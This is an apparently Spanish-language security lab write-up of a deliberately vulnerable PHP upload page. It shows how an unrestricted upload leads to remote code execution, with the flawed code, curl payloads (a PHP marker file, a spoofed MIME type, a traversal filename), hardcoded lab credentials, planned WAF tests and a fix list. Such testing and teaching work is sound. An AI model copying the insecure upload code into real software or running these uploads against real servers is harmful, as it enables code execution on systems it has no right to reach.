# LAB-06 — Subida de archivos sin restricción

| Campo | Valor |
|---|---|
| **ID** | LAB-06 |
| **Tipo** | Subida de archivos sin control (Unrestricted File Upload) — deriva en ejecución remota de código |
| **Riesgo** | Crítico (ejecución de código en el servidor con los permisos de `www-data`) |
| **CWE** | CWE-434 (deriva en CWE-94 / CWE-502 según el caso) |
| **OWASP** | A04:2021 — Insecure Design |
| **Endpoint** | `POST /fa/sistemas/lab/subidas.php` campo `adjunto` — ejecución en `GET /fa/sistemas/uploads/<archivo>` |
| **Acceso** | Requiere sesión iniciada (Administrador o Técnico) para subir; **sin** sesión para ejecutar lo ya subido |
| **Implementada** | 26 de septiembre de 2026 |

---

## 1. Qué hace

La página de adjuntos de órdenes de trabajo acepta **cualquier archivo**: no
revisa la extensión, ni el tipo MIME, ni el contenido, ni el tamaño declarado. Lo
guarda con el nombre que le dio el usuario, dentro de `uploads/`, que está
**dentro del document root** del servidor web.

Esa última frase es toda la vulnerabilidad. Un archivo guardado bajo
`/var/www/html/fa/sistemas/uploads/` no es un dato: es una URL. Y si esa URL
termina en `.php`, Apache no la descarga, la **ejecuta**.

El resultado se verificó de punta a punta en este entorno: se subió un archivo
llamado `evidencia.php` con una línea de PHP que imprime el intérprete y el
identificador del proceso, y al pedirlo por HTTP devolvió

```
RCE-LAB06: apache2handler uid=33
```

`uid=33` es `www-data`, el usuario con el que corre el servidor web. Es decir: la
subida no se queda en "un archivo raro en una carpeta", se convierte en ejecución
remota de código dentro del servidor, y a partir de ahí el alcance es el del
sistema operativo.

Hay un detalle que conviene mirar de cerca porque cambia el encuadre: la
autorización existe y funciona. `lab/subidas.php` línea 36 exige
`require_role(array(1, 2))`, y sin sesión la subida devuelve `302` al formulario
de acceso. El problema no es quién puede subir, es **qué se guarda una vez que
ha subido**.

Y hay un segundo detalle, más incómodo: la autorización **no protege la
ejecución**. El archivo guardado se pide después sin ninguna sesión y sin
ningún control, porque lo sirve Apache directamente. Verificado: sin cookie
ninguna, `uploads/lab06prueba.php` devuelve `RCE-LAB06 uid=33`.

---

## 2. Dónde está el código

### 2.1 El bloque vulnerable

`lab/subidas.php`, líneas 49 a 71:

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['adjunto'])) {
    $f = $_FILES['adjunto'];

    if ($f['error'] !== UPLOAD_ERR_OK) {
        $errores[] = 'La carga fallo (codigo ' . $f['error'] . ').';
    } else {
        // SIN VALIDACION: se usan $f['name'] tal cual y no se revisa ni la
        // extension ni el tipo real. LAB-06.
        $nombre_destino = $destino_dir . basename($f['name']);

        if (file_exists($nombre_destino)) {
            $errores[] = 'Ya existe un archivo con ese nombre en el servidor.';
        } elseif (!move_uploaded_file($f['tmp_name'], $nombre_destino)) {
            $errores[] = 'No se pudo guardar el archivo en el servidor.';
        } else {
            chmod($nombre_destino, 0644);
            $subida = true;

            audit_log('CREATE', 'lab',
                ' subio el archivo ' . $f['name'] . ' (' . $f['size'] . ' bytes, tipo ' . $f['type'] . ')');
        }
    }
}
```

Y el destino, línea 42:

```php
$destino_dir = __DIR__ . '/../uploads/';
```

`__DIR__` es `/var/www/html/fa/sistemas/lab`, así que `$destino_dir` es
`/var/www/html/fa/sistemas/uploads/`. El `DocumentRoot` de Apache es
`/var/www/html` (verificado con `apache2ctl -S`). El archivo queda, por tanto,
a tres niveles de la raíz pública y es alcanzable por URL.

Lo que hay entre `if ($f['error'] ...)` y `move_uploaded_file()` es todo lo que
el módulo valida: **nada**. La única condición que decide es `file_exists()`,
que no es una medida de seguridad sino una comodidad para no sobrescribir.

### 2.2 El formulario

`lab/subidas.php`, líneas 126 a 133:

```php
<form method="post" action="<?php echo url('lab/subidas.php'); ?>" enctype="multipart/form-data">
    <div class="mb-3">
        <label class="form-label" for="adjunto">Archivo adjunto</label>
        <input type="file" class="form-control" id="adjunto" name="adjunto" required>
        <div class="form-text">Tamano maximo recomendado: 5 MB</div>
    </div>
```

El `<input type="file">` no lleva atributo `accept`. Es cierto que `accept` es
solo una ayuda de interfaz y que un cliente HTTP lo ignora, así que no sería la
corrección; pero su ausencia indica que nadie pensó el problema ni siquiera para
el navegador.

### 2.3 Por qué `basename()` no alcanza

`basename($f['name'])` está en la línea 58 y hace una cosa bien hecha: quita los
directorios del nombre. Se verificó subiendo un archivo cuyo nombre declarado
era `../../ev2.php`:

```
subida aceptada
/var/www/html/fa/sistemas/uploads/ev2.php   ← el recorrido se perdió
/var/www/html/fa/                            ← no se escribió nada aquí
```

El path traversal en el **nombre** está neutralizado. La extensión peligrosa
no lo está: el archivo sigue llamándose `ev2.php` y sigue siendo ejecutable.

Conviene decirlo así de claro porque es el error de razonamiento habitual: se
piensa "ya escapo el nombre, ya estoy a salvo", y lo que se ha escapado es el
nombre, no el **contenido ni el tipo de archivo**. Un atacante no necesita
escapar de `uploads/`: ya está escribiendo dentro del directorio público. Lo
único que le hace falta es que el nombre termine en algo que el intérprete de
Apache ejecute.

### 2.4 Por qué un `.htaccess` no arregla nada

La mitigación clásica de este problema —un `.htaccess` en el directorio de
subidas con `php_flag engine off` o una regla que prohíba el intérprete— **no
funciona en este servidor**, y está verificado en la configuración:

```
/etc/apache2/apache2.conf:  AllowOverride None
```

Con `AllowOverride None` Apache ignora cualquier `.htaccess`. No es que el
archivo esté mal escrito: es que no se lee. Además el archivo no existe:
`.gitignore` incluso contempla `uploads/.htaccess` como excepción para
versionarlo, lo que muestra que la intención llegó a plantearse y se quedó en la
lista de descendedores.

Conviene añadir un detalle: `.gitignore` declara `uploads/*` y a continuación
`!uploads/.htaccess`, como si el archivo existiera. Comprobado:
`/var/www/html/fa/sistemas/uploads/` contiene únicamente lo que sube la
aplicación, sin `.htaccess`.

La única mitigación por configuración posible sería mover `uploads/` fuera del
document root, o declarar un `<Directory>` en un vhost propio que no le asigne
handler de PHP; las dos cosas requieren tocar la configuración del servidor con
`sudo` y fuera del alcance de este laboratorio.

### 2.5 El tamaño: lo que dice la pantalla y lo que hay

La línea 130 anuncia "Tamano maximo recomendado: 5 MB". Es texto, y además es
falso por partida doble:

- En el código **no hay** ninguna comprobación de tamaño.
- El único límite que existe es el del intérprete, y no es 5 MB: en este
  servidor `upload_max_filesize = 2M` y `post_max_size = 8M`. Son valores
  globales de PHP, no de la aplicación: protegen contra que se agote el disco,
  no contra nada que tenga que ver con el tipo de archivo.

Verificado con un `.php` de 3 MB: la subida se rechaza con
`La carga fallo (codigo 1)`, que es `UPLOAD_ERR_INI_SIZE`. El código 1 lo genera
PHP, no la aplicación, y el mensaje que ve el usuario es el del módulo. Y el otro
lado del límite también se comprobó: un `.php` de 1.5 MB se almacena sin
protestar y se ejecuta igual que el de 60 bytes. El límite de 2 MB decide el
tamaño, no el riesgo.

### 2.6 La corrección que está escrita en el propio archivo

El comentario de cabecera de `lab/subidas.php` (líneas 14 a 22) describe
exactamente el camino seguro, y no se implementó:

```php
$permitidas = array('pdf', 'png', 'jpg', 'docx');
$info = new finfo(FILEINFO_MIME_TYPE);
$mime = $info->file($tmp);
$ext  = strtolower(pathinfo($nombre, PATHINFO_EXTENSION));
if (!in_array($ext, $permitidas, true)) {
    $errores[] = 'Extension no permitida.';
}
```

Queda como referencia, igual que `secure_login()` en LAB-01: la corrección está
escrita al lado del fallo.

---

## 3. Por qué existe en una app real

El módulo nació como una caja de adjuntos para las fotos de una orden de
trabajo: un `<input
type="file">`, un `move_uploaded_file()` y una lista de lo que hay en la carpeta.
En ese momento el riesgo era bajo, porque el directorio era interno y los
usuarios eran de confianza.

El módulo se rompió por una concatenación de tres decisiones, y las tres son
normales en un sistema que lleva años en producción:

1. **El directorio se eligió por comodidad, no por seguridad.** Guardar junto a
   la aplicación es lo más simple: no hay que crear una ruta fuera del
   `DocumentRoot`, no hay que escribir un descargador, no hay que pensar en
   permisos. La carpeta `uploads/` en la raíz del proyecto es lo que escribe
   cualquier desarrollador que sube archivos sin que nadie le haya explicado que
   esa carpeta es pública por definición.
2. **Aparecieron tipos de archivo que el caso de uso original no contemplaba.**
   Cuando el formulario pasó de "foto de una orden de trabajo" a "cualquier
   documento del técnico", la lista mental de lo que puede llegar se ensanchó:
   `.docx`, `.pdf`, `.zip`, `.php`. La lista blanca nunca se escribió porque en
   las pruebas manuales nadie subió un `.php`.
3. **Nadie probó el segundo paso.** La comprobación de que esto es crítico no
   es si la subida funciona, es si lo subido se puede pedir. La validación de un
   formulario de subida se prueba en el navegador: se sube un PDF, aparece en la
   lista, se descarga. El `GET` al archivo subido solo se prueba cuando el
   archivo tiene extensión ejecutable, y eso no lo hace nadie por casualidad.

Es el patrón más común del laboratorio visto desde el otro lado: **una
funcionalidad legítima añadida sobre un dato que el usuario controla**. La
aplicación no falla por lo que hace la pantalla, falla por lo que acepta y por
dónde lo deja caer.

---

## 4. Payloads

Todos probados contra `http://localhost/fa/sistemas/lab/subidas.php` con sesión
de administrador.

### Sesión previa

```bash
curl -s -o /dev/null -c cookies.txt \
  --data-urlencode "username=admin" --data-urlencode "password=Admin_2026!" \
  http://localhost/fa/sistemas/login.php
```

### Los cinco casos

```bash
# 1. CONTROL - archivo legitimo
printf 'Informe de visita tecnica del equipo INV-000055\n' > informe.txt
curl -s -b cookies.txt -F "adjunto=@informe.txt;filename=informe.txt" \
  http://localhost/fa/sistemas/lab/subidas.php | grep -c "Archivo almacenado"
curl -s -i http://localhost/fa/sistemas/uploads/informe.txt | head -1

# 2. ATAQUE - .php que se ejecuta en el servidor
printf '%s' '<?php echo "RCE-LAB06: ".php_sapi_name()." uid=".getmyuid();' > evidencia.php
curl -s -b cookies.txt -F "adjunto=@evidencia.php;filename=evidencia.php" \
  http://localhost/fa/sistemas/lab/subidas.php | grep -c "Archivo almacenado"
curl -s http://localhost/fa/sistemas/uploads/evidencia.php

# 3. ATAQUE - tipo MIME declarado falso
curl -s -b cookies.txt -F "adjunto=@evidencia.php;filename=se_acomoda.php;type=image/png" \
  http://localhost/fa/sistemas/lab/subidas.php | grep -c "Archivo almacenado"
curl -s -o /dev/null -w "%{content_type}\n" http://localhost/fa/sistemas/uploads/se_acomoda.php

# 4. ATAQUE - recorrido en el nombre
curl -s -b cookies.txt -F "adjunto=@evidencia.php;filename=../../ev2.php" \
  http://localhost/fa/sistemas/lab/subidas.php | grep -c "Archivo almacenado"
ls -l /var/www/html/fa/sistemas/uploads/ev2.php

# 5. CONTROL - limite real de tamano
head -c 3145728 /dev/urandom > grande.php
curl -s -b cookies.txt -F "adjunto=@grande.php;filename=grande.php" \
  http://localhost/fa/sistemas/lab/subidas.php | grep -o "La carga fallo (codigo 1)"

# 6. CONTROL - sin sesion
curl -s -o /dev/null -w "%{http_code}\n" \
  -F "adjunto=@evidencia.php;filename=sin_sesion.php" \
  http://localhost/fa/sistemas/lab/subidas.php
```

| # | Caso | Verificación | Resultado verificado |
|---:|---|---|---|
| 1 | `informe.txt` (control) | `GET /uploads/informe.txt` | `200`, `Content-Type: text/plain`, contenido servido |
| 2 | `evidencia.php` | `GET /uploads/evidencia.php` | `200` y **`RCE-LAB06: apache2handler uid=33`** |
| 3 | `se_acomoda.php` con `type=image/png` | `GET /uploads/se_acomoda.php` | `Content-Type: text/html`: el navegador lo ejecuta, y `audit_log` guardó "tipo image/png" |
| 4 | `filename=../../ev2.php` | `ls uploads/` | Se guarda como `uploads/ev2.php`: la extensión sobrevive al `basename()` |
| 5 | `.php` de 3 MB | Respuesta de la subida | `La carga fallo (codigo 1)`: límite de PHP (2M), no de la app |
| 6 | Subida sin sesión | Código HTTP | `302` a `login.php`: la autorización sí funciona |
| 7 | Nombre repetido | Respuesta de la subida | `Ya existe un archivo con ese nombre en el servidor.` |

El caso 3 merece atención porque es el que suele usarse en vídeo: el atacante
manda `Content-Type: image/png`, la aplicación lo copia tal cual a la bitácora
(`tipo image/png`) y el archivo se sirve como `text/html`. Cualquier sistema que
confíe en el tipo que declara el cliente —una validación hecha en el navegador,
un antivirus que solo mire la cabecera, un clasificador que consume el
`Content-Type`— se queda sin ver nada.
El tipo real se obtiene con `finfo_file()`, nunca con `$_FILES['type']`.

El caso 2 no necesita ninguna sutileza. No hay que escapar nada, no hay que
codificar nada, no hay que conocer el sistema. Se sube un archivo con extensión
`.php` y se pide.

### El rastro que deja la subida

La propia aplicación registra la subida en `audit_log` (línea 68):

```
admin | CREATE | lab | ::1 |  subio el archivo se_acomoda.php (60 bytes, tipo image/png)
```

Es decir: el módulo se registra a sí mismo, con el nombre y el tamaño reales del
archivo. Un `.php` subido aparece en la auditoría como una subida de 60 bytes. Si
en algún momento se revisa esa tabla buscando shells, el registro dice
`application/octet-stream` o `image/png`, que son precisamente las etiquetas que
no disparan ninguna alerta.

### Limpieza

Los archivos que se suben en las pruebas hay que borrarlos a mano
(`rm -f uploads/evidencia.php uploads/informe.txt ...`). El directorio `uploads/`
no tiene index y la página de listado solo los muestra: un `.php` que se queda
ahí sigue siendo una shell ejecutable para cualquiera que conozca el nombre, y
`lab_matrix.sh` deja `lab06prueba.php` en el disco al terminar. Así, este comando
devuelve código ejecutado, y no es una hipótesis:

```bash
curl -s http://localhost/fa/sistemas/uploads/lab06prueba.php
# RCE-LAB06 uid=33
```

---

## 5. Escenario A vs Escenario B

El objetivo de la demostración es comparar el **mismo código** en los dos lados.

| Prueba | Escenario A (Apache directo) | Escenario B (SafeLine) — esperado |
|---|---|---|
| 1. `informe.txt` (control) | Almacenado y servido | Almacenado y servido |
| 2. Subida sin sesión (control) | `302` al login | `302` al login |
| 3. Nombre repetido (control) | "Ya existe" | "Ya existe" |
| 4. `evidencia.php` subido y pedido | **`RCE-LAB06: apache2handler uid=33`** | **Sin ejecución del código** |
| 5. `se_acomoda.php` con tipo falso | Servido como `text/html` | Sin ejecución del código |
| 6. `filename=../../ev2.php` | Guardado como `uploads/ev2.php` | Igual o bloqueado en la subida |
| 7. `.php` de 3 MB | `codigo 1` (límite de PHP) | `codigo 1` (límite de PHP) |

Las filas 1, 2, 3 y 7 son los controles: el WAF no debe cambiar su
comportamiento, y no lo cambia, porque no tienen nada sospechoso.

La fila 4 es la única cuyo comportamiento debe cambiar, y hay que decirlo con
precisión porque este ataque tiene **dos pasos**: subir y ejecutar. SafeLine
puede actuar sobre cualquiera de los dos, o sobre los dos, y cada variante deja
rastros distintos. Por eso el resultado del Escenario B hay que interpretarlo con
cuidado, y no basta con "el `grep` no encontró el marcador":

| Qué pasó | Cómo se distingue |
|---|---|
| La subida se bloqueó | El `POST` a `lab/subidas.php` devuelve la página de bloqueo de SafeLine. En disco no hay archivo nuevo y `audit_log` no crece |
| La subida pasó y la ejecución se bloqueó | El archivo existe en `uploads/` y hay su fila en `audit_log`, pero el `GET` a `/uploads/<archivo>.php` devuelve la página de bloqueo |
| La subida pasó y la ejecución también | El `GET` devuelve `RCE-LAB06`. Eso es un fallo de la demostración y hay que decirlo como tal |

**Esta ejecución del Escenario B todavía no se ha hecho.** SafeLine no está
instalado en este entorno; se desplegará después, en el VPS, escuchando en el
puerto `8000` y reenviando a `http://127.0.0.1:80`. Todo lo de la columna
derecha es **esperado**, no medido.

### Escenario A — Apache directo

```bash
curl -s -o /dev/null -c cookies.txt \
  --data-urlencode "username=admin" --data-urlencode "password=Admin_2026!" \
  http://localhost/fa/sistemas/login.php

curl -s -b cookies.txt -F "adjunto=@evidencia.php;filename=evidencia.php" \
  http://localhost/fa/sistemas/lab/subidas.php > /dev/null

curl -s http://localhost/fa/sistemas/uploads/evidencia.php
# RCE-LAB06: apache2handler uid=33
```

### Escenario B — detrás de SafeLine

Mismos comandos, mismo orden, solo cambia el host:

```bash
curl -s -o /dev/null -c cookies.txt \
  --data-urlencode "username=admin" --data-urlencode "password=Admin_2026!" \
  http://192.168.100.22:8000/fa/sistemas/login.php

curl -s -b cookies.txt -F "adjunto=@evidencia.php;filename=evidencia.php" \
  http://192.168.100.22:8000/fa/sistemas/lab/subidas.php

curl -s http://192.168.100.22:8000/fa/sistemas/uploads/evidencia.php
```

### Cómo lo verifica la matriz

`documents/lab_matrix.sh` sube un archivo llamado `lab06prueba.php` con el
contenido `<?php echo "RCE-LAB06 uid=".getmyuid();` y después pide
`/uploads/lab06prueba.php`. La prueba se evalúa con un `grep` de un marcador
exacto:

```bash
curl -s "$BASE_URL/uploads/lab06prueba.php" | grep -c 'RCE-LAB06'
```

Si el marcador aparece, el archivo se ejecutó. Con `--waf` la expectativa se
invierte: en el Escenario B la prueba se considera correcta solo si el marcador
**no** aparece. Conviene tener presente que la matriz solo mira el `GET`: no
distingue "no se subió" de "se subió pero no se ejecutó". Para eso hay que mirar
el `POST` y la tabla `audit_log`, como se explica arriba.

```bash
# Escenario A
./documents/lab_matrix.sh

# Escenario B
./documents/lab_matrix.sh http://192.168.100.22:8000/fa/sistemas --waf -v
```

---

## 6. Qué debería hacer SafeLine

SafeLine debe tratar esto como lo que es: una subida de archivo ejecutable. La
regla de archivo adjunto tiene que actuar sobre el cuerpo `multipart/form-data`
y sobre la ruta de la URL, antes de que la solicitud llegue a Apache.

| Aspecto | Valor esperado |
|---|---|
| Regla activada | Subida de archivo ejecutable / webshell (extensión del archivo en el `multipart`) |
| Modo recomendado | `Strict` |
| También cubre | `GET /uploads/*.php` y cualquier ruta bajo el directorio de subidas |
| Respuesta | Página de bloqueo de SafeLine, tanto en el `POST` como en el `GET` |
| Origen en la app | Ninguno: ni el `POST` ni el `GET` deben llegar a `lab/subidas.php` ni a Apache |
| Efecto secundario esperado | `audit_log` no debe crecer con la fila `CREATE` de la subida |

Ese último punto es el que separa un bloqueo real de un bloqueo aparente: la
subida se registra sola en `audit_log` (línea 68). Si la fila aparece, la
petición llegó a la aplicación.

```sql
SELECT COUNT(*) FROM audit_log
 WHERE modulo = 'lab' AND descripcion LIKE '%subio el archivo%';   -- repetir antes y despues
```

### La segunda mitad del problema

Un WAF que solo mira el `POST` deja el archivo en el disco. En ese momento el
`.php` está dentro del document root y su URL es pública, así que el segundo
paso —pedirlo— sigue abierto salvo que SafeLine también intercepte las peticiones
a `/uploads/`. La cobertura completa de esta práctica son **las dos rutas**:
`lab/subidas.php` y `uploads/`.

### Lo que un WAF no cubre aquí

| Límite | Por qué |
|---|---|
| Un WAF no sabe si un archivo es malicioso | Solo ve extensión, tipo declarado y patrones. Un `.pdf` con un exploit de lector, o una imagen con PHP embebido en los metadatos, no se distinguen |
| El `Content-Type` del cliente es falsificable | Un WAF que confíe en la cabecera del `multipart` reproduce el error de la aplicación. Lo único fiable es el contenido |
| Apache sirve `uploads/` directamente | Si alguien llega a `http://192.168.100.22/uploads/...` por una ruta que no pasa por el proxy, el WAF no existe ahí |
| Un `.php` ya subido sigue vivo | Bloquear la subida nueva no limpia `uploads/`. Si el directorio se sirve por Apache sin pasar por SafeLine, el archivo se sigue ejecutando |
| La aplicación sigue aceptando `.php` | La regla del WAF es una red, no un contrato. En cuanto cambie la ruta de entrada, o se desactive el proxy, la subida vuelve a funcionar |

### Nota de vídeo

El orden importa. Si en el Escenario B se sube primero y se pide después, la
página de bloqueo de SafeLine aparece en el `GET`, y eso es correcto. Si se pide
`/uploads/lab06prueba.php` **antes** de subir nada, el archivo puede no existir
todavía y el `404` que devuelve Apache no es un bloqueo: es un archivo que no
está. Conviene hacer la demostración en orden y, si hace falta, usar el archivo
que dejó la ejecución anterior (`lab06prueba.php` está ahí) para separar las dos
preguntas: "¿bloquea la subida?" y "¿bloquea la ejecución?".

---

## 7. Aislamiento de la vulnerabilidad

Regla del proyecto: **un solo punto vulnerable por práctica**, para que el
resultado de la matriz no se mezcle.

- `lab/subidas.php` es el único módulo de toda la aplicación que escribe en disco
  un archivo cuyo nombre o contenido elige el usuario. Ningún otro hace
  `move_uploaded_file()` ni `file_put_contents()` con entrada externa.
- `uploads/` no lo lee ningún otro módulo: `config/app.php` define la constante
  `UPLOAD_DIR` (línea 55) pero ningún archivo la usa, y no hay ningún `include`,
  ni `file_get_contents()`, ni consulta que recorra el directorio. Es un
  directorio de salida pura, y por eso el único consumidor es Apache sirviéndolo
  como archivo estático.
- El `.php` subido no ejecutaría nada de la aplicación: corre en su propio
  proceso, con los permisos de `www-data`, sin pasar por `config/app.php` ni por
  la base de datos. Por eso el aislamiento de la matriz sigue siendo válido: la
  salida de `RCE-LAB06` viene del intérprete, no de la aplicación.
- La auditoría de la subida (línea 68) usa el `$f['type']` del cliente. No es una
  segunda vulnerabilidad sino la misma: el tipo declarado se acepta sin verificar.
- Nota de coherencia entre fichas: `documents/LAB-05-Path-Traversal.md` afirma en
  su sección 7 que "las subidas de LAB-06 se sirven desde `uploads/` con su propia
  validación de extensión". Lo segundo no es cierto: no hay ninguna validación.
  Esta ficha es la que describe ese módulo, y la frase de LAB-05 debería
  entenderse como la referencia a la intención documentada en el comentario de
  cabecera, no como un control existente.

---

## 8. La conclusión del laboratorio

SafeLine puede bloquear esta subida, y eso es una defensa real: si además
cubre la ruta `/uploads/`, cierra los dos pasos. Pero un WAF es una capa, no la
solución. Aquí la solución es una decisión de diseño, y esa decisión es la que
nunca se tomó: **dónde se guarda un archivo que envía un usuario**.

La corrección completa, en orden de importancia:

1. **Guardar fuera del document root.** Un directorio de subidas fuera de
   `/var/www/html` sirve el archivo desde un script PHP que comprueba sesión y rol
   y lo entrega con `Content-Type` y `Content-Disposition` correctos. Con eso, un
   `.php` subido es un archivo inerte. Es la única medida que sobrevive a que el
   WAF esté apagado.
2. **Lista blanca de extensiones**, comprobada contra la extensión del nombre
   que genera el servidor, no contra el que manda el cliente.
3. **Tipo MIME real** con `finfo(FILEINFO_MIME_TYPE)`, comparado con la lista
   blanca. Nunca `$_FILES['type']`, que es una cadena escrita por el atacante.
4. **Nombre generado en el servidor** (`random_bytes()` o `uniqid()`), sin
   relación con el nombre original. `basename()` no es un nombre generado: sigue
   siendo una entrada del usuario, y un usuario puede elegir la extensión que
   quiera.
5. **Límite de tamaño en la aplicación**, comprobado contra `filesize()` y
   contra `ini_get('upload_max_filesize')`, y no solo el texto de la pantalla.
6. **Directorio de subidas no ejecutable** en la configuración del servidor, como
   segunda barrera. En este entorno no es posible con `.htaccess` porque
   `AllowOverride` es `None`; hay que hacerlo en el `apache2.conf` o en un vhost.

Y una conclusión de proceso que es la que más se repite en este laboratorio: la
vulnerabilidad no estaba en una validación mal escrita, estaba en una
**validación no escrita**. La comprobación de que un formulario de subida es
seguro no es si el archivo se descarga bien, es si lo que se sube se puede pedir
después. En esta aplicación, `uploads/` lleva años lleno de archivos que nadie
ha vuelto a mirar.
